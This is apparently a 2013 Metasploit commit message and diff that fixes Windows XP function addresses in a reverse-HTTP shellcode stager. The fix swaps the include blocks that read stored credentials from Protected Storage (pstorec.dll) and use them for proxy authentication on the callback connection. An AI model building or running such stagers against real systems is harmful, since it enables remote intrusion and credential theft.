83929facc4ed4a2a4efb9b3cabe9fcf34e0dc5d0
somename11111 <somename11111@gmail.com>
2013-08-06 20:18:09 +0200

    Fix bug on Windows XP
    Correct the addresses of functions in pstorec.dll.
    
    Successfully tested on Server 2003 and XP.

--- external/source/shellcode/windows/x86/src/stager/stager_reverse_http_proxy_pstore.asm
+++ external/source/shellcode/windows/x86/src/stager/stager_reverse_http_proxy_pstore.asm
@@ -12,7 +12,7 @@
 %include "./src/block/block_api.asm"
 start:                   ;
   pop ebp                ; pop off the address of 'api_call' for calling later.
-%include "./src/block/block_get_pstore_proxy_auth.asm"
-%include "./src/block/block_reverse_http_use_proxy_auth.asm"
+%include "./src/block/block_get_pstore_creds.asm"
+%include "./src/block/block_reverse_http_use_proxy_creds.asm"
   ; By here we will have performed the reverse_tcp connection and EDI will be our socket.
 
